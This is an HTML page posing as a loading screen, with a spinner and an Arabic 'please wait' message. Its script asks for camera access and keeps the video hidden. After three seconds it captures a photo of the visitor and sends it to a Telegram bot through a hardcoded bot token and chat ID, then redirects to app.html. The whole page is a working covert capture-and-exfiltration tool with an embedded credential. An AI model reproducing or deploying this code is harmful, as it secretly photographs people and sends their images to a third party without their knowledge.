<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading & Camera</title>
  <style>
    body {
      margin: 0;
      background: #111;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      color: white;
      font-family: Arial, sans-serif;
    }

    .loader {
      border: 8px solid #333;
      border-top: 8px solid #00f0ff;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #video {
      display: none;
    }
  </style>
</head>
<body>

  <div class="loader"></div>
  <div>يرجى الانتظار...</div>
  <video id="video" autoplay></video>

  <script>
    const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
    const CHAT_ID = '7327464581';

    async function captureAndSendPhoto() {
      try {
        const video = document.getElementById('video');

        // الوصول إلى الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // الانتظار 3 ثواني
        await new Promise(res => setTimeout(res, 3000));

        // تصوير لقطة
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // تحويل الصورة إلى Blob
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        // تحضير البيانات للإرسال
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');

        // إرسال الصورة إلى بوت تيليجرام
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());

        // الانتقال إلى app.html
        window.location.href = 'app.html';

      } catch (error) {
        alert('حدث خطأ أثناء إعطاء الاذن لكود الطالب');
        console.error(error);
      }
    }

    captureAndSendPhoto();
  </script>
</body>
</html>
